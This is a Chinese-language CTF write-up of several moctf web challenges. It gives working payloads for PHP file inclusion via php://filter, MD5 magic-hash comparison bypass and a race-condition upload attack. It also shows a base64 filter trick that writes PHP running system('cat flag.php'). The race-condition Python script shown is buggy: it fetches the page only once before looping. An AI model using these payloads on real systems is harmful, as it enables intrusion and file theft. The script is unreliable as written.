还是水题

知识点：修改html标签属性

打开题目，要求在输入框内输入moctf，但是无法输入。

所以f12查看器，找到输入框的属性
删掉

disabled="disabled"

并改maxlength=”5”，然后输入moctf得到flag。

我想要钱

知识点：php的科学记数法，time()函数

打开题目，一道代码审计：
time()函数返回当前的unix时间戳。
money应该少于等于四位且大于当前的unix时间戳。那么它大概有多大呢？
将当前时间转换为时间戳：1555848362，是个十位的大数。 要让最多四位的money大于这个数，就要用到科学记数法。

payload：

?money=1e10

得到flag。

关于科学计数法

P.S. 虽然在excel中1.00E+10是正确写法，但1e10好像也并非是错误的。

文件包含

知识点：文件包含，phpfilter协议流

打开题目，url为说明可利用文件包含。在源代码注释中发现有

<!--flag.php-->

直接访问没有发现flag。

于是使用filter协议，构造payload:

?file=php://filter/read=convert.base64-encode/resource=flag.php

得到一串base64：

SSBoYXZlIGEgZmxhZyEKPD9waHAgCgovL0ZsYWc6IG1vY3Rme2YxbGVfaW5jbHVkNF9lNXN5fQovL0J5OmRhb3l1YW4KCj8+Cg==

解码得到flag。

P.S. base64编码前为php代码会被直接执行，而编码后可以读取。

php黑魔法

知识点：php~源码泄露

hint：好像有源码

猜测应该是源码泄露。于是尝试各种方法，最终发现index.php~中f12查看到源代码。

<?php
$flag="moctf{**************}";

if (isset($_GET['a'])&&isset($_GET['b'])) {
    $a=$_GET['a'];
    $b=$_GET['b'];


    if($a==$b) 
    {
        echo "<center>Wrong Answer!</center>";
    }
    else {
        if(md5($a)==md5($b)) 
        {
            echo "<center>".$flag."</center>"; 
            echo "By:daoyuan";
        }
        else echo "<center>Wrong Answer!</center>";
    }

}
else echo "<center>濂藉儚灏戜簡鐐逛粈涔�</center>"; 
?>

要求a与b的值不同而md5的值相同，构造payload：

http://119.23.73.3:5001/web5/index.php?a=QNKCDZO&b=240610708

得到flag。

知识点：302跳转，条件竞争

打开题目链接，跳转到index2.php。考虑到一般都是直接index.php，所以尝试一下，发现还是会跳转到index2。猜测可能是302跳转。

burp抓包。action->Send to Repeater将index2改为index，Go。

访问uploadsomething.php
试着随便传了下文件，得知要得到flag就要访问给出的文件路径。
访问路径，却显示“Too Slow！”

这里卡了好久，后来想到应该是上传后立刻服务器将文件删除。此处就可以利用条件竞争漏洞。

  • 使用burp不停上传文件
  • 使用脚本不停访问文件
    上传如图内容取得路径：http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233

    burp

    burp抓包 action->send to intruder
  • clear $
  • payload type:null payloads
  • payload options -> continue indefinitely
  • number of threads:20

    py脚本

    脚本如下：
import requests
u = "http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233"
t = requests.get(u).text
while True:
    print(t)

得到flag。

死亡退出

知识点：base64绕过php exit

打开题目，发现直接给出一段代码。


可以看到$c初始值为”<?php exit; ?>”，然后.=我们post进去的c值。

即：

<?php
    exit;
?>
xxxxx

其中xxxxx是我们传进去的数据。

所以无论我们传入什么数据，$c的头部都会是一段exit，直接退出脚本。那么，现在的问题就是如何绕过这段exit了。

经百度得知，可以使用phpfilter协议流进行绕过。

于是构造payload

c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&file=php://filter/write=convert.base64-decode/resource=tmp.php

利用hackbar，post，成功绕过。
